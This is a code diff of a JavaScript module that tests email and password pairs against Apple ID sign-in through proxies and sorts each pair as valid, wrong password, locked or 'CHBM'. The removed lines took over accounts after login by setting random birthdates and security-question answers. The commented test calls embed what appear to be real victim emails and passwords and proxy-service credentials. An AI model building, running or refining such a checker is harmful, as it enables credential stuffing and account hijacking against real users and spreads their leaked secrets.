@@ -1,7 +1,6 @@
 const cheerio = require('cheerio');
 const axios = require('axios-https-proxy-fix');
 const { GSASRPAuthenticator } = require('./GSASRPAuthenticator');
-const { randomString, randomBirthdate } = require('./helper');
 
 const instance = axios.create({
   timeout: 30000
@@ -13,35 +12,13 @@ const getFrameId = () => {
   return e + "-" + Math.random().toString(36).substr(2, 8)
 }
 
-const repair = (proxy, widgetKey) => {
-  return new Promise((resolve) => {
-    let config = {
-      method: 'get',
-      proxy,
-      maxBodyLength: Infinity,
-      url: `https://appleid.apple.com/widget/account/repair?widgetKey=${widgetKey}&rv=1&language=en_US_USA`,
-    };
-
-    instance.request(config)
-      .then((response) => {
-        resolve(response?.headers['set-cookie'])
-      })
-      .catch((error) => {
-        if (!error?.response?.status) {
-          resolve(false)
-        } else {
-          resolve(error.response?.headers['set-cookie'])
-        }
-      });
-  })
-}
-
-const initSRP = (proxy, bodyData) => {
+const initSRP = (proxy, bodyData, cancelToken) => {
   var data = JSON.stringify(bodyData);
-  return new Promise((resolve) => {
+  return new Promise((resolve, reject) => {
     let config = {
       method: 'post',
       proxy,
+      cancelToken,
       maxBodyLength: Infinity,
       url: `https://idmsa.apple.com/appleauth/auth/signin/init`,
       headers: {
@@ -66,23 +43,21 @@ const initSRP = (proxy, bodyData) => {
       .then((response) => {
         resolve(response?.data)
       })
-      .catch((error) => {
-        console.log("initSRP failed!")
-        resolve(false)
-      });
+      .catch(reject);
   })
 }
 
-const loginIdApple = (proxy, proof) => {
+const loginIdApple = (proxy, proof, cancelToken) => {
   var data = JSON.stringify({
     ...proof,
     rememberMe: true,
     trustTokens: []
   });
-  return new Promise((resolve) => {
+  return new Promise((resolve, reject) => {
     let config = {
       method: 'post',
       proxy,
+      cancelToken,
       maxBodyLength: Infinity,
       url: `https://idmsa.apple.com/appleauth/auth/signin/complete`,
       headers: {
@@ -108,30 +83,28 @@ const loginIdApple = (proxy, proof) => {
         resolve({ cookies: response?.headers['set-cookie'], headers: response?.headers })
       })
       .catch((error) => {
-        // console.log(error?.response);
         if (error?.response?.status == 409) {
           resolve("CHBM")
-        } 
-        // else if (error?.response?.status == 401) {
-        //   resolve("sai pass")
-        // } 
-        else if (error?.response?.status == 412) {
+        } else if (error?.response?.status == 401) {
+          resolve("sai pass")
+        } else if (error?.response?.status == 412) {
           resolve({ cookies: error?.response?.headers['set-cookie'], headers: error?.response?.headers })
         } else if (error?.response?.status == 403) {
           resolve('locked')
         } else {
-          resolve(false)
+          reject(error)
         }
       });
   })
 }
 
-const getConfigRequest = (proxy, frame_id) => {
+const getConfigRequest = (proxy, frame_id, cancelToken) => {
   const url = `https://idmsa.apple.com/appleauth/auth/authorize/signin?frame_id=${frame_id}&language=en_us&skVersion=7&iframeId=${frame_id}&client_id=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&redirect_uri=https://appleid.apple.com&response_type=code&response_mode=web_message&state=${frame_id}&authVersion=latest`;
-  return new Promise((resolve) => {
+  return new Promise((resolve, reject) => {
     var options = {
       'method': 'GET',
       proxy,
+      cancelToken,
       'url': url,
       'headers': {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -161,446 +134,60 @@ const getConfigRequest = (proxy, frame_id) => {
         })
         resolve(id)
       })
-      .catch((e) => {
-        resolve(false);
-      });
+      .catch(reject);
   })
 }
 
-const option = (proxy, sessionId, sessionToken, widgetId) => {
-  return new Promise((resolve) => {
-    let config = {
-      method: 'get',
-      maxBodyLength: Infinity,
-      proxy,
-      url: 'https://appleid.apple.com/account/manage/repair/options',
-      headers: {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'Referer': 'https://appleid.apple.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'X-Apple-ID-Session-Id': sessionId,
-        'X-Apple-Mandate-Security-Upgrade': '0',
-        'X-Apple-Session-Token': sessionToken,
-        'X-Apple-Skip-Repair-Attributes': '[]',
-        'X-Apple-Widget-Key': widgetId,
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"macOS"'
-      }
-    };
-
-    instance.request(config)
-      .then((response) => {
-        if (response?.data?.security?.birthday || (response?.data?.repairMissingData && response?.data?.repairMissingData?.includes("birthday"))) {
-          resolve({ type: "birthday", headers: response.headers })
-        } else if (response?.data?.security?.questions || (response?.data?.repairMissingData && response?.data?.repairMissingData?.includes("questions"))) {
-          resolve({ type: "questions", headers: response.headers })
-        } else if (response?.data?.repairContext?.repairType) {
-          if (response?.data?.repairContext?.repairType == "crossBorderPrivacyConsent") {
-            resolve({ type: "crossBorderPrivacyConsent", headers: response.headers })
-          } else if (response?.data?.repairContext?.repairType == "adiToAspPrivacyConsent") {
-            resolve({ type: "adiToAspPrivacyConsent", headers: response.headers })
-          } else {
-            resolve({ type: "repairType", headers: response.headers })
-          }
-        } else if (response?.data?.repairItem === "email") {
-          resolve({ type: "repairEmail", headers: response.headers })
-        } else {
-          resolve(false)
-        }
-      })
-      .catch((error) => {
-        if (error?.response?.data?.security?.birthday || (error?.response?.data?.repairMissingData && error?.response?.data?.repairMissingData?.includes("birthday"))) {
-          resolve({ type: "birthday", headers: response.headers })
-        } else if (error?.response?.data?.security?.questions || (error?.response?.data?.repairMissingData && error?.response?.data?.repairMissingData?.includes("questions"))) {
-          resolve({ type: "questions", headers: response.headers })
-        } else {
-          resolve(false)
-        }
-      });
-  })
-}
-
-const consent = (proxy, type, aidsp, sessionToken, scnt, widgetId) => {
-  let data = JSON.stringify({
-    "account": {
-      "preferences": {
-        "privacyPreferences": {
-          "appleCrossBorderPrivacyNoticeAccepted": true
-        }
-      }
-    },
-    "completedSteps": [],
-    "requiredSteps": [
-      "crossBorderPrivacyConsent"
-    ],
-    "repairContext": {
-      "repairType": "crossBorderPrivacyConsent",
-      "repairItems": [
-        "crossBorderPrivacyConsent"
-      ]
-    }
-  });
-  if (type === "crossBorderPrivacyConsent") {
-    data = JSON.stringify({
-      "account": {
-        "preferences": {
-          "privacyPreferences": {
-            "gcbdCrossBorderPrivacyNoticeAccepted": true
-          }
-        }
-      },
-      "completedSteps": [],
-      "requiredSteps": [
-        "crossBorderPrivacyConsent"
-      ],
-      "repairContext": {
-        "repairType": "crossBorderPrivacyConsent",
-        "repairItems": [
-          "crossBorderPrivacyConsent"
-        ]
-      }
-    });
+// Login checks stop after authentication; account repair actions are not invoked.
+const CHBMAppleID = async (email, pass, proxyString, options = {}) => {
+  const result = (status, note, details = {}) => ({ mail: email, pass, status, ...(note && { note }), ...details });
+  const unchecked = (reason, retryable = false) => result('not checked', undefined, { reason, retryable });
+  let proxy = false;
+  if (proxyString) {
+    const parts = String(proxyString).split(':');
+    if (![2, 4].includes(parts.length) || !parts[0] || !/^\d+$/.test(parts[1]) ||
+        Number(parts[1]) < 1 || Number(parts[1]) > 65535 ||
+        (parts.length === 4 && (!parts[2] || !parts[3]))) return result('not checked', 'invalid proxy');
+    proxy = { protocol: 'http', host: parts[0], port: Number(parts[1]),
+      ...(parts.length === 4 && { auth: { username: parts[2], password: parts[3] } }) };
   }
-  if (type === "adiToAspPrivacyConsent") {
-    data = JSON.stringify({
-      "account": {
-        "preferences": {
-          "privacyPreferences": {
-            "adiToAspPrivacyNoticeAccepted": true
-          }
-        }
-      },
-      "completedSteps": [],
-      "requiredSteps": [
-        "adiToAspPrivacyConsent"
-      ],
-      "repairContext": {
-        "repairType": "adiToAspPrivacyConsent",
-        "repairItems": [
-          "adiToAspPrivacyConsent"
-        ]
-      }
-    });
+  const source = axios.CancelToken.source();
+  let expired = false;
+  const timeout = setTimeout(() => { expired = true; source.cancel('Login deadline exceeded'); }, options.timeoutMs || 90000);
+  try {
+    const widgetKey = await getConfigRequest(proxy, getFrameId(), source.token);
+    if (expired) return unchecked('timeout', true);
+    if (!widgetKey) return unchecked('unknown_response');
+    const authenticator = new GSASRPAuthenticator(email);
+    const initData = await authenticator.getInit();
+    if (expired) return unchecked('timeout', true);
+    const initResp = await initSRP(proxy, initData, source.token);
+    if (expired) return unchecked('timeout', true);
+    if (!initResp) return unchecked('unknown_response');
+    const proof = await authenticator.getComplete(pass, initResp);
+    if (expired) return unchecked('timeout', true);
+    const completeResp = await loginIdApple(proxy, proof, source.token);
+    if (expired) return unchecked('timeout', true);
+    if (!completeResp) return unchecked('unknown_response');
+    if (typeof completeResp === 'string') return result('checked', completeResp);
+    return result('checked', 'successfully');
+  } catch (error) {
+    if (expired || ['ECONNABORTED', 'ETIMEDOUT', 'ESOCKETTIMEDOUT'].includes(error?.code)) return unchecked('timeout', true);
+    const status = error?.response?.status;
+    if (status === 503) return unchecked('service_unavailable', true);
+    if (status === 407) return unchecked('proxy_error', true);
+    if (!error?.response && (error?.request || ['ECONNRESET', 'ECONNREFUSED', 'ENOTFOUND', 'EAI_AGAIN', 'ENETUNREACH', 'EHOSTUNREACH', 'EPIPE', 'ERR_NETWORK', 'ERR_PROXY_CONNECTION_FAILED'].includes(error?.code))) {
+      return unchecked('network_error', true);
+    }
+    return unchecked('unknown_response');
+  } finally {
+    clearTimeout(timeout);
   }
-  let url = 'https://appleid.apple.com/account/manage/repair/privacy/consent';
-  if (type === "adiToAspPrivacyConsent") {
-    url = 'https://appleid.apple.com/account/manage/repair/privacy/consent/adiToAspPrivacyConsent';
-  }
-  return new Promise((resolve) => {
-    let config = {
-      method: 'post',
-      maxBodyLength: Infinity,
-      proxy,
-      url,
-      headers: {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'Cookie': `idclient=web; dslang=US-EN; site=USA; aidsp=${aidsp}`,
-        'Origin': 'https://appleid.apple.com',
-        'Referer': 'https://appleid.apple.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-        'X-Apple-I-TimeZone': 'Asia/Bangkok',
-        'X-Apple-Session-Token': sessionToken,
-        'X-Apple-ID-Session-Id': aidsp,
-        'scnt': scnt,
-        'X-Apple-Locale': 'en_us',
-        'X-Apple-Mandate-Security-Upgrade': '0',
-        'X-Apple-Skip-Repair-Attributes': '[]',
-        'X-Apple-Widget-Key': widgetId,
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"macOS"',
-        'Cookie': 'dslang=US-EN; site=USA'
-      },
-      data
-    };
-
-    instance.request(config)
-      .then(function (response) {
-        resolve({ cookies: response.headers['set-cookie'] });
-      })
-      .catch(function (error) {
-        resolve(false);
-      });
-  })
-}
-
-const repairBirthDay = (proxy, sessionId, sessionToken, scnt, widgetId) => {
-  let birthday = randomBirthdate();
-  let data = JSON.stringify({
-    "security": {
-      "birthday": birthday
-    }
-  });
-  return new Promise((resolve) => {
-    let config = {
-      method: 'put',
-      maxBodyLength: Infinity,
-      proxy,
-      url: 'https://appleid.apple.com/account/manage/repair',
-      headers: {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Length': '0',
-        'Content-Type': 'application/json',
-        'Origin': 'https://appleid.apple.com',
-        'Referer': 'https://appleid.apple.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'X-Apple-ID-Session-Id': sessionId,
-        'scnt': scnt,
-        'X-Apple-Mandate-Security-Upgrade': '0',
-        'X-Apple-Session-Token': sessionToken,
-        'X-Apple-Skip-Repair-Attributes': '[]',
-        'X-Apple-Widget-Key': widgetId,
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"macOS"',
-        'Cookie': 'dslang=US-EN; site=USA'
-      },
-      data: data
-    };
-
-    instance.request(config)
-      .then(function (response) {
-        resolve(birthday);
-      })
-      .catch(function (error) {
-        resolve(false);
-      });
-  })
-}
-
-const repairQuestions = (proxy, sessionId, sessionToken, scnt, widgetId) => {
-  let answer1 = randomString(10);
-  let answer2 = randomString(10);
-  let answer3 = randomString(10);
-  let data = JSON.stringify({
-    "security": {
-      "questions": [
-        {
-          "id": "130",
-          "question": "What is the first name of your best friend in high school?",
-          "answer": answer1,
-          "number": 1
-        },
-        {
-          "id": "136",
-          "question": "What is your dream job?",
-          "answer": answer2,
-          "number": 2
-        },
-        {
-          "id": "142",
-          "question": "In what city did your parents meet?",
-          "answer": answer3,
-          "number": 3
-        }
-      ]
-    }
-  });
-  return new Promise((resolve) => {
-    let config = {
-      method: 'put',
-      maxBodyLength: Infinity,
-      proxy,
-      url: 'https://appleid.apple.com/account/manage/repair/questions',
-      headers: {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Length': '0',
-        'Content-Type': 'application/json',
-        'Origin': 'https://appleid.apple.com',
-        'Referer': 'https://appleid.apple.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'X-Apple-ID-Session-Id': sessionId,
-        'scnt': scnt,
-        'X-Apple-Mandate-Security-Upgrade': '0',
-        'X-Apple-Session-Token': sessionToken,
-        'X-Apple-Skip-Repair-Attributes': '[]',
-        'X-Apple-Widget-Key': widgetId,
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"macOS"',
-        'Cookie': 'dslang=US-EN; site=USA'
-      },
-      data: data
-    };
-
-    instance.request(config)
-      .then(function (response) {
-        resolve([`What is the first name of your best friend in high school?|${answer1}|What is your dream job?|${answer2}|In what city did your parents meet?|${answer3}`]);
-      })
-      .catch(function (error) {
-        resolve(false);
-      });
-  })
-}
-
-const CHBMAppleID = (email, pass, proxyString) => {
-  return new Promise(async (resolve) => {
-    const frame_id = getFrameId();
-    const proxyArr = proxyString.split(":");
-    const proxy = {
-      protocol: 'http',
-      host: proxyArr[0],
-      port: parseInt(proxyArr[1]),
-      ...(proxyArr[2] && {
-        auth: {
-          username: proxyArr[2],
-          password: proxyArr[3],
-        }
-      })
-    }
-    let birthday = '';
-    try {
-      setTimeout(() => {
-        return resolve({
-          mail: email,
-          pass: pass,
-          proxy: proxyString,
-          status: 'not checked'
-        })
-      }, 90000);
-      for (let index = 0; index < 3; index++) {
-        let widgetKey = await getConfigRequest(proxy, frame_id);
-        if (!widgetKey) {
-          return resolve({
-            mail: email,
-            pass: pass,
-            proxy: proxyString,
-            status: 'not checked'
-          })
-        }
-        // set up SRP authenticator & get public key
-        let authenticator = new GSASRPAuthenticator(email);
-        let initData = await authenticator.getInit();
-        // request SRP init data from server
-        let initResp = await initSRP(proxy, initData);
-        if (initResp) {
-          // get proof of password
-          let proof = await authenticator.getComplete(pass, initResp);
-          // send proof to server
-          let completeResp = await loginIdApple(proxy, proof);
-          if (typeof completeResp === "string") {
-            return resolve({
-              mail: email,
-              pass: pass,
-              proxy: proxyString,
-              status: 'checked',
-              note: completeResp
-            })
-          } else if (completeResp) {
-            let { headers } = completeResp;
-            let aidsp = null;
-            const repairCookies = await repair(proxy, widgetKey);
-            if (Array.isArray(repairCookies) && headers) {
-              for (const c of repairCookies) {
-                if (c.includes("aidsp=")) {
-                  let carr = c.split(";")
-                  aidsp = carr[0]?.split("=")?.[1]
-                }
-              }
-              let optionHeader = await option(proxy, aidsp, headers['x-apple-repair-session-token'], widgetKey);
-              if (optionHeader) {
-                let type = optionHeader.type;
-                optionHeader = optionHeader.headers;
-                if (type == 'repairType' || type == 'crossBorderPrivacyConsent' || type == 'adiToAspPrivacyConsent') {
-                  if (type == 'crossBorderPrivacyConsent' && index > 1) {
-                    type = 'repairType';
-                  }
-                  await consent(proxy, type, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
-                  continue;
-                } else if (type == 'birthday') {
-                  birthday = await repairBirthDay(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
-                  continue;
-                } else if (type == 'questions') {
-                  const questions = await repairQuestions(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
-                  if (questions) {
-                    return resolve({
-                      mail: email,
-                      pass: pass,
-                      proxy: proxyString,
-                      status: 'checked',
-                      note: 'successfully',
-                      questions: questions,
-                      birthday
-                    })
-                  }
-                } else if (type == 'repairEmail') {
-                  return resolve({
-                    mail: email,
-                    pass: pass,
-                    proxy: proxyString,
-                    status: 'checked',
-                    note: 'repair email'
-                  })
-                }
-              } else {
-                return resolve({
-                  mail: email,
-                  pass: pass,
-                  proxy: proxyString,
-                  status: 'not checked',
-                  note: 'custom'
-                })
-              }
-            } else {
-              break;
-            }
-          } else {
-            return resolve({
-              mail: email,
-              pass: pass,
-              proxy: proxyString,
-              status: 'not checked'
-            })
-          }
-        }
-      }
-      return resolve({
-        mail: email,
-        pass: pass,
-        proxy: proxyString,
-        status: 'not checked'
-      })
-    } catch (error) {
-      console.log(error);
-      return resolve({
-        mail: email,
-        pass: pass,
-        proxy: proxyString,
-        status: 'not checked'
-      })
-    }
-  })
-}
+};
 
 // (async () => {
-//   let a = await CHBMAppleID("kentuckycolonel_97@yahoo.com", "TBup39@ilajl", "datacenter-ww.lightningproxies.net:3500");
-//   console.log(a);
-// })()
+//   const result = await CHBMAppleID('emad_ayed-77@hotmail.com', 'WCH24q712@azms', 'as.lumiproxy.io:5888:lumi-lumip3jxa8qy4v9:NUZnacBTmBasd123');
+//   console.log(result);
+// })();
 
-module.exports = {
-  CHBMAppleID
-};
+module.exports = { CHBMAppleID };
